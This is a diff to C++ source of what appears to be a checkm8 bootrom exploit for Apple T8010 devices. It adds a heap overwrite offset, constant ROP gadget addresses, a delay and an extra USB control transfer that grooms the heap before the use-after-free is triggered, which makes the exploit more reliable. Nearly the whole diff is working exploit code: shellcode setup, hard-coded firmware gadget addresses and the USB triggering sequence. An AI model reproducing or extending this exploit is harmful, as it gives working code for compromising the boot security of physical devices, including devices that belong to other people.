@@ -1,3 +1,4 @@
+#include <GdbStub.h>
 #include <assert.h>
 #include <fcntl.h>
 #include <fstream>
@@ -26,20 +27,25 @@ const int PAYLOAD_SIZE_ARMV7 = 320;
 const int PAYLOAD_OFFSET_ARM64 = 384;
 const int PAYLOAD_SIZE_ARM64 = 576;
 
+// Use offset to not thrash the heap
+const int t8010_overwrite_offset = 0x580;
+
 typedef struct _DeviceConfig {
   std::string version;
   int cpid;
   int large_leak;
   uint8_t *overwrite;
   int overwrite_size;
+  int overwrite_offset;
   int hole;
   int leak;
 
   _DeviceConfig(std::string version, int cpid, int large_leak,
-                uint8_t *overwrite, int overwrite_size, int hole, int leak)
+                uint8_t *overwrite, int overwrite_size, int hole,
+                int overwrite_offset, int leak)
       : version(version), cpid(cpid), large_leak(large_leak),
-        overwrite(overwrite), overwrite_size(overwrite_size), hole(hole),
-        leak(leak) {}
+        overwrite(overwrite), overwrite_size(overwrite_size),
+        overwrite_offset(overwrite_offset), hole(hole), leak(leak) {}
 } DeviceConfig;
 
 typedef struct _Callback {
@@ -203,14 +209,14 @@ vector<uint8_t> getT8010Shellcode() {
       0x180088B48,          // 8 - PAYLOAD_PTR
   };
 
-  uint64_t t8010_func_gadget = 0x10000CC4C;
-  uint64_t t8010_enter_critical_section = 0x10000A4B8;
-  uint64_t t8010_exit_critical_section = 0x10000A514;
-  uint64_t t8010_dc_civac = 0x10000046C;
-  uint64_t t8010_write_ttbr0 = 0x1000003E4;
-  uint64_t t8010_tlbi = 0x100000434;
-  uint64_t t8010_dmb = 0x100000478;
-  uint64_t t8010_handle_interface_request = 0x10000DFB8;
+  const uint64_t t8010_func_gadget = 0x10000CC4C;
+  const uint64_t t8010_enter_critical_section = 0x10000A4B8;
+  const uint64_t t8010_exit_critical_section = 0x10000A514;
+  const uint64_t t8010_dc_civac = 0x10000046C;
+  const uint64_t t8010_write_ttbr0 = 0x1000003E4;
+  const uint64_t t8010_tlbi = 0x100000434;
+  const uint64_t t8010_dmb = 0x100000478;
+  const uint64_t t8010_handle_interface_request = 0x10000DFB8;
 
   vector<Callback> t8010_callbacks = {
       Callback(t8010_dc_civac, 0x1800B0600),
@@ -298,7 +304,8 @@ vector<uint8_t> getT8010Shellcode() {
 
 #pragma pack(1)
 typedef struct alignas(1) {
-  uint8_t temp0[0x580] = {0};
+  // uint8_t temp0[0x580] = {0}; // Use offset to not trash the heap (Linus
+  // Henze)
   uint8_t temp1[32] = {0};
   uint64_t t8010_nop_gadget0 = 0x10000CC6C;
   uint64_t Offset = 0x1800B0800;
@@ -314,7 +321,7 @@ void runCheckm8() {
   assert(sizeof(t8010_overwrite) == 1524);
 
   DeviceConfig DC_t8010("iBoot-2696.0.0.1.33", 0x8010, 0, (uint8_t *)&Overwrite,
-                        sizeof(Overwrite), 5, 1);
+                        sizeof(Overwrite), t8010_overwrite_offset, 5, 1);
 
   // Get shellcode
   auto Shellcode = getT8010Shellcode();
@@ -342,13 +349,21 @@ void runCheckm8() {
   D.usb_reset();
   D.release_device();
 
+  sleep_ms(500);
+
   printf("[*] stage 2, usb setup, send 0x800 of 'A', sends no data\n");
   D.acquire_device();
   // libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
   std::vector<uint8_t> A800;
   A800.insert(A800.end(), 0x800, 'A');
   D.libusb1_async_ctrl_transfer(0x21, 1, 0, 0, A800, 0.0001);
-  // libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
+
+  // Advance buffer offset before triggering the UaF to prevent trashing the
+  // heap
+  std::vector<uint8_t> AOverwrite;
+  AOverwrite.insert(AOverwrite.end(), DC_t8010.overwrite_offset, 'A');
+  D.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, AOverwrite.data(),
+                                   AOverwrite.size(), 10);
   D.libusb1_no_error_ctrl_transfer(0x21, 4, 0, 0, 0, 0, 0);
   D.release_device();
 
